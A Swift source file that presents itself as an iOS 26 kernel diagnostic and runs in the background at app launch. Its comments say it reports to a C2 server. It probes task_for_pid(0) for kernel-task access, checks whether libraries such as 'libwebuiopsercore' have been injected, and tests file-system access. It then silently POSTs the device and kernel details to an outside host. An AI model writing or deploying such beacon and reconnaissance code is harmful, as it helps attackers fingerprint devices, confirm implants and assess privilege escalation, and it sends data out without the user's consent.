import Foundation

// iOS 26 内核诊断 — 启动时自动上报
// 上报到 C2 服务器，不做任何破坏性操作
enum DiagReport {

    static func run() {
        DispatchQueue.global(qos: .utility).async { collectAndSend() }
    }

    // MARK: - 采集

    private static func collectAndSend() {
        var info: [String: Any] = [:]

        // 1. iOS / 内核版本
        info["ios_version"]    = sysctl_string("kern.osversion")  // e.g. 24A5264n
        info["os_type"]        = sysctl_string("kern.ostype")
        info["os_release"]     = sysctl_string("kern.osrelease")  // e.g. 26.5.0
        info["hw_machine"]     = sysctl_string("hw.machine")      // e.g. iPhone17,2
        info["pid"]            = Int(getpid())

        // 2. 尝试 task_for_pid(0) — 需要 platform 权限，普通 app 必然失败
        //    失败码本身有意义：KERN_PROTECTION_FAILURE vs KERN_INVALID_ARGUMENT
        var kernTask = mach_task_self_
        let tfp_ret = task_for_pid(mach_task_self_, 0, &kernTask)
        info["tfp0_result"]    = tfp_ret          // 0=成功，否则失败码
        info["tfp0_ok"]        = (tfp_ret == KERN_SUCCESS)

        // 3. 自身 task 信息（不需要特权）
        var taskInfo = mach_task_basic_info()
        var count = mach_msg_type_number_t(MACH_TASK_BASIC_INFO_COUNT)
        withUnsafeMutablePointer(to: &taskInfo) {
            $0.withMemoryRebound(to: integer_t.self, capacity: Int(count)) { ptr in
                _ = task_info(mach_task_self_, task_flavor_t(MACH_TASK_BASIC_INFO), ptr, &count)
            }
        }
        info["virtual_size"]   = taskInfo.virtual_size
        info["resident_size"]  = taskInfo.resident_size

        // 4. 系统调用测试 — 判断 syscall 访问情况
        // proc_info syscall (SYS_proc_info = 336)
        let pid = getpid()
        var pinfo = proc_taskallinfo()
        let proc_ret = proc_pidinfo(pid, PROC_PIDTASKALLINFO, 0, &pinfo, Int32(MemoryLayout<proc_taskallinfo>.size))
        info["proc_pidinfo_ret"] = proc_ret      // 成功返回 struct 大小
        if proc_ret > 0 {
            info["proc_flags"]  = pinfo.pbsd.pbi_flags
            info["proc_uid"]    = pinfo.pbsd.pbi_uid
            info["proc_pid"]    = pinfo.pbsd.pbi_pid
        }

        // 5. dyld image 列表 — 查看 libwebuiopsercore 是否已注入
        let imageCount = _dyld_image_count()
        var libs: [String] = []
        for i in 0..<imageCount {
            if let name = _dyld_get_image_name(i) {
                let s = String(cString: name)
                if s.contains("webuiopser") || s.contains("wkisolate") || s.contains("SDWeb") {
                    libs.append(s)
                }
            }
        }
        info["injected_libs"] = libs
        info["dyld_image_count"] = imageCount

        // 6. 额外：读 /proc 类似路径测试（iOS 没有 /proc，测 /private/var 可访问性）
        let varAccess = FileManager.default.isReadableFile(atPath: "/private/var/mobile")
        info["var_mobile_readable"] = varAccess

        // 7. 发送
        send(payload: info)
    }

    // MARK: - sysctl helper

    private static func sysctl_string(_ name: String) -> String {
        var size = 0
        sysctlbyname(name, nil, &size, nil, 0)
        guard size > 0 else { return "" }
        var buf = [CChar](repeating: 0, count: size)
        sysctlbyname(name, &buf, &size, nil, 0)
        return String(cString: buf)
    }

    // MARK: - 上报

    private static func send(payload: [String: Any]) {
        guard let url = URL(string: "https://api.1.uploads.bbt333.top/api/ios26_diag") else { return }
        guard let body = try? JSONSerialization.data(withJSONObject: payload) else { return }

        var req = URLRequest(url: url, timeoutInterval: 15)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = body

        URLSession.shared.dataTask(with: req) { data, resp, _ in
            if let data, let s = String(data: data, encoding: .utf8) {
                print("[DiagReport] server: \(s)")
            }
        }.resume()
    }
}
